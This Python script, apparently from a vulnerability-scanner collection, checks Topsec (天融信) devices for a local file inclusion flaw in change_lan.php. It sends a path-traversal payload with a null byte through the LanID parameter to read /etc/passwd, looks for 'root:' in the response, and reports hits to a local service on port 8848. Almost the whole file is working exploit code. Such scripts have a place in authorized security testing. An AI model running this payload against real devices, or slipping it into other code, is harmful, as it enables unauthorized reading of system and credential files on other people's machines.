#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 天融信Topsec change_lan.php本地文件包含
referer: http://www.wooyun.org/bugs/wooyun-2015-0118464
author: Lucifer
description: 文件change_lan.php中,参数LanID存在包含。
'''
import sys
import requests
import warnings
from termcolor import cprint

class topsec_change_lan_filedownload_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/change_lan.php?LanID=../../../../../../../../../etc/passwd%00"
        vulnurl = self.url + payload
        sess = requests.Session()
        try:
            req = sess.get(vulnurl, headers=headers, timeout=10, verify=False)
            req2 = sess.get(self.url, headers=headers, timeout=10, verify=False)
            if r"root:" in req2.text and r":/bin" in req2.text:
                cprint("[+]存在天融信Topsec change_lan.php本地文件包含漏洞...(高危)\tpayload: "+vulnurl, "red")
                postdata = {self.url:"存在天融信Topsec change_lan.php本地文件包含漏洞...(高危)\tpayload: "+vulnurl}
                requests.post('http://localhost:8848/system', json=postdata) 
            else:
                cprint("[-]不存在topsec_change_lan_filedownload漏洞", "white", "on_grey")

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = topsec_change_lan_filedownload_BaseVerify(sys.argv[1])
    testVuln.run()